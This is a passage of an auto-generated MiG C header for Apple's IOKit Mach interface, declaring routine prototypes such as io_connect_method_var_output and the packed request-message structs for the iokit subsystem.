	kern_return_t *result,
	mach_port_t *notification
);

/* Routine io_registry_entry_get_registry_entry_id */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_registry_entry_id
(
	mach_port_t registry_entry,
	uint64_t *entry_id
);

/* Routine io_connect_method_var_output */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_method_var_output
(
	mach_port_t connection,
	uint32_t selector,
	io_scalar_inband64_t scalar_input,
	mach_msg_type_number_t scalar_inputCnt,
	io_struct_inband_t inband_input,
	mach_msg_type_number_t inband_inputCnt,
	mach_vm_address_t ool_input,
	mach_vm_size_t ool_input_size,
	io_struct_inband_t inband_output,
	mach_msg_type_number_t *inband_outputCnt,
	io_scalar_inband64_t scalar_output,
	mach_msg_type_number_t *scalar_outputCnt,
	io_buf_ptr_t *var_output,
	mach_msg_type_number_t *var_outputCnt
);

/* Routine io_service_get_matching_service */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_get_matching_service
(
	mach_port_t master_port,
	io_string_t matching,
	mach_port_t *service
);

/* Routine io_service_get_matching_service_ool */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_get_matching_service_ool
(
	mach_port_t master_port,
	io_buf_ptr_t matching,
	mach_msg_type_number_t matchingCnt,
	kern_return_t *result,
	mach_port_t *service
);

/* Routine io_service_get_authorization_id */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_get_authorization_id
(
	mach_port_t service,
	uint64_t *authorization_id
);

/* Routine io_service_set_authorization_id */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_set_authorization_id
(
	mach_port_t service,
	uint64_t authorization_id
);

/* Routine io_server_version */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_server_version
(
	mach_port_t master_port,
	uint64_t *version
);

/* Routine io_registry_entry_get_properties_bin */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_properties_bin
(
	mach_port_t registry_entry,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
);

/* Routine io_registry_entry_get_property_bin */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_property_bin
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t property_name,
	uint32_t options,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
);

/* Routine io_service_get_matching_service_bin */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_get_matching_service_bin
(
	mach_port_t master_port,
	io_struct_inband_t matching,
	mach_msg_type_number_t matchingCnt,
	mach_port_t *service
);

/* Routine io_service_get_matching_services_bin */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_get_matching_services_bin
(
	mach_port_t master_port,
	io_struct_inband_t matching,
	mach_msg_type_number_t matchingCnt,
	mach_port_t *existing
);

/* Routine io_service_match_property_table_bin */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_match_property_table_bin
(
	mach_port_t service,
	io_struct_inband_t matching,
	mach_msg_type_number_t matchingCnt,
	boolean_t *matches
);

/* Routine io_service_add_notification_bin */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_add_notification_bin
(
	mach_port_t master_port,
	io_name_t notification_type,
	io_struct_inband_t matching,
	mach_msg_type_number_t matchingCnt,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
	mach_port_t *notification
);

/* Routine io_registry_entry_get_path_ool */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_path_ool
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_string_inband_t path,
	io_buf_ptr_t *path_ool,
	mach_msg_type_number_t *path_oolCnt
);

/* Routine io_registry_entry_from_path_ool */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_from_path_ool
(
	mach_port_t master_port,
	io_string_inband_t path,
	io_buf_ptr_t path_ool,
	mach_msg_type_number_t path_oolCnt,
	kern_return_t *result,
	mach_port_t *registry_entry
);

/* Routine io_device_tree_entry_exists_with_name */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_device_tree_entry_exists_with_name
(
	mach_port_t master_port,
	io_name_t name,
	boolean_t *exists
);

/* Routine io_registry_entry_get_properties_bin_buf */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_properties_bin_buf
(
	mach_port_t registry_entry,
	mach_vm_address_t buf,
	mach_vm_size_t *bufsize,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
);

/* Routine io_registry_entry_get_property_bin_buf */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_property_bin_buf
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t property_name,
	uint32_t options,
	mach_vm_address_t buf,
	mach_vm_size_t *bufsize,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
);

__END_DECLS

/********************** Caution **************************/
/* The following data types should be used to calculate  */
/* maximum message sizes only. The actual message may be */
/* smaller, and the position of the arguments within the */
/* message layout may vary from what is presented here.  */
/* For example, if any of the arguments are variable-    */
/* sized, and less than the maximum is sent, the data    */
/* will be packed tight in the actual message to reduce  */
/* the presence of holes.                                */
/********************** Caution **************************/

/* typedefs for all requests */

#ifndef __Request__iokit_subsystem__defined
#define __Request__iokit_subsystem__defined

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_object_get_class_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t classNameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t classNameCnt;
		char className[128];
	} __Request__io_object_conforms_to_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_iterator_next_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_iterator_reset_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingOffset; /* MiG doesn't use it */
		mach_msg_type_number_t matchingCnt;
		char matching[512];
	} __Request__io_service_get_matching_services_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
	} __Request__io_registry_entry_get_property_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		uint32_t options;
	} __Request__io_registry_create_iterator_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_registry_iterator_enter_entry_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_registry_iterator_exit_entry_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[512];
	} __Request__io_registry_entry_from_path_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_registry_entry_get_name_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_registry_entry_get_properties_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
		mach_msg_type_number_t dataCnt;
	} __Request__io_registry_entry_get_property_bytes_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} __Request__io_registry_entry_get_child_iterator_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} __Request__io_registry_entry_get_parent_iterator_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_service_close_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_connect_get_service_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t connect_to;
		/* end of the kernel processed data */
	} __Request__io_connect_add_client_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Request__io_connect_set_properties_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} __Request__io_registry_entry_get_path_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_registry_get_root_entry_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Request__io_registry_entry_set_properties_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} __Request__io_registry_entry_in_plane_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_object_get_retain_count_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_service_get_busy_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_timespec_t wait_time;
	} __Request__io_service_wait_quiet_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		uint32_t options;
	} __Request__io_registry_entry_create_iterator_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_iterator_is_valid_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t inData;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t flag;
		mach_msg_type_number_t inDataCnt;
	} __Request__io_catalog_send_data_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t flag;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} __Request__io_catalog_terminate_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t flag;
	} __Request__io_catalog_get_data_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_catalog_get_gen_count_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} __Request__io_catalog_module_loaded_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t flag;
	} __Request__io_catalog_reset_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t options;
	} __Request__io_service_request_probe_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} __Request__io_registry_entry_get_name_in_plane_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingOffset; /* MiG doesn't use it */
		mach_msg_type_number_t matchingCnt;
		char matching[512];
	} __Request__io_service_match_property_table_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		natural_t notification_type;
	} __Request__io_connect_get_notification_semaphore_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} __Request__io_registry_entry_get_location_in_plane_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
		uint32_t options;
	} __Request__io_registry_entry_get_property_recursively_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_service_get_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t matching;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
	} __Request__io_service_get_matching_services_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t matching;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
	} __Request__io_service_match_property_table_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t obj_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t obj_nameCnt;
		char obj_name[128];
	} __Request__io_object_get_superclass_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t obj_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t obj_nameCnt;
		char obj_name[128];
	} __Request__io_object_get_bundle_identifier_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t owningTask;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t connect_type;
		NDR_record_t ndr;
		mach_msg_type_number_t propertiesCnt;
	} __Request__io_service_open_extended_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t into_task;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t memory_type;
		mach_vm_address_t address;
		mach_vm_size_t size;
		uint32_t flags;
	} __Request__io_connect_map_memory_into_task_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t from_task;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t memory_type;
		mach_vm_address_t address;
	} __Request__io_connect_unmap_memory_from_task_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t selector;
		mach_msg_type_number_t scalar_inputCnt;
		io_user_scalar_t scalar_input[16];
		mach_msg_type_number_t inband_inputCnt;
		char inband_input[4096];
		mach_vm_address_t ool_input;
		mach_vm_size_t ool_input_size;
		mach_msg_type_number_t inband_outputCnt;
		mach_msg_type_number_t scalar_outputCnt;
		mach_vm_address_t ool_output;
		mach_vm_size_t ool_output_size;
	} __Request__io_connect_method_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
		uint32_t selector;
		mach_msg_type_number_t scalar_inputCnt;
		io_user_scalar_t scalar_input[16];
		mach_msg_type_number_t inband_inputCnt;
		char inband_input[4096];
		mach_vm_address_t ool_input;
		mach_vm_size_t ool_input_size;
		mach_msg_type_number_t inband_outputCnt;
		mach_msg_type_number_t scalar_outputCnt;
		mach_vm_address_t ool_output;
		mach_vm_size_t ool_output_size;
	} __Request__io_connect_async_method_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t notification_type;
		io_user_reference_t reference;
	} __Request__io_connect_set_notification_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t notification_typeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t notification_typeCnt;
		char notification_type[128];
		mach_msg_type_number_t matchingOffset; /* MiG doesn't use it */
		mach_msg_type_number_t matchingCnt;
		char matching[512];
		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
	} __Request__io_service_add_notification_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t type_of_interestOffset; /* MiG doesn't use it */
		mach_msg_type_number_t type_of_interestCnt;
		char type_of_interest[128];
		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
	} __Request__io_service_add_interest_notification_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t matching;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t notification_typeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t notification_typeCnt;
		char notification_type[128];
		mach_msg_type_number_t matchingCnt;
		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
	} __Request__io_service_add_notification_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_registry_entry_get_registry_entry_id_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t selector;
		mach_msg_type_number_t scalar_inputCnt;
		io_user_scalar_t scalar_input[16];
		mach_msg_type_number_t inband_inputCnt;
		char inband_input[4096];
		mach_vm_address_t ool_input;
		mach_vm_size_t ool_input_size;
		mach_msg_type_number_t inband_outputCnt;
		mach_msg_type_number_t scalar_outputCnt;
	} __Request__io_connect_method_var_output_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingOffset; /* MiG doesn't use it */
		mach_msg_type_number_t matchingCnt;
		char matching[512];
	} __Request__io_service_get_matching_service_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t matching;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
	} __Request__io_service_get_matching_service_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_service_get_authorization_id_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint64_t authorization_id;
	} __Request__io_service_set_authorization_id_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_server_version_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__io_registry_entry_get_properties_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
		uint32_t options;
	} __Request__io_registry_entry_get_property_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
		char matching[4096];
	} __Request__io_service_get_matching_service_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
		char matching[4096];
	} __Request__io_service_get_matching_services_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
		char matching[4096];
	} __Request__io_service_match_property_table_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t notification_typeOffset; /* MiG doesn't use it */
